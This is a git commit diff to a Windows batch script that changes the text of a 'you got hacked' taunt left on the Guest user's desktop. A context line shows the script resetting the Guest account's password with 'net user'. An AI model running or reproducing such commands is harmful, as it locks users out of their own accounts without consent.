9ab084979de05ceef6a38d494af11cce839ec874
UkiMer <150144368+UkiMer@users.noreply.github.com>
2024-09-26 16:16:18 -0300

    Update script-deidad.bat

--- script-deidad.bat
+++ script-deidad.bat
@@ -18,7 +18,7 @@ cd /d C:\
 cd Users
 cd Invitado
 cd Desktop
-echo Fuiste jakeadoooooo por los jesusitos > Jesupillos.txt
+echo Fuiste jakeadoooooo por los jesusitos, Felipe y Lucas > Jesupillos.txt
 net user Invitado Chao!3010
 
 cd /d C:\
